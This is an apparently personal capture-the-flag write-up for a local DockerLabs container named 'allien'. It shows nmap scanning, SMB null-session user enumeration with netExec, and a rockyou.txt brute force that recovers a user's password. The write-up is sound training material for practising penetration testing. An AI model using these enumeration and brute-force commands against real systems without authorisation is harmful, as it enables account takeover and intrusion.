# How to run the docker container
Download link: https://mega.nz/file/6RVkASLT#-F9PMveM06geq87FUaUAuHFpkEq85tG61zZGkswgcsE (Or just go to dockerlabs.es)

Afterwards, unzip the file, and run the command
```
sudo ./auto_deploy.sh allien.tar
```
Upon success, we get the container IP address 172.17.0.2

# Scanning the container IP address
We use nmap to scan the IP address:
```
nmap -p- -sCV -T4 -vv 172.17.0.2 (what are these flags?)
```
We should see 4 open ports: 22, 80, 445 and 139. Port 445 and 139 runs the SMB protocol (what is that)

# In this challenge, there is an SMB service that allows null sessions (no username and password)
To verify that, we run netExec:
```
nxc smb 172.17.0.2 -u '' -p ''
```
*  -u means username
*  -p means password
The entries in the quotation marks are the values for each flag.
It should return "Null Auth:True"
tagging the command with:
```
nxc smb 172.17.0.2 -u '' -p '' --username
```
allows us to see the users in the protocol. 'satriani7' is our target here.

# Run brute force password cracking 
We use netExec to bruteforce the password with a standard password list rockyou.txt:
```
nxc smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```
and walah, we get a success!
```
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
```


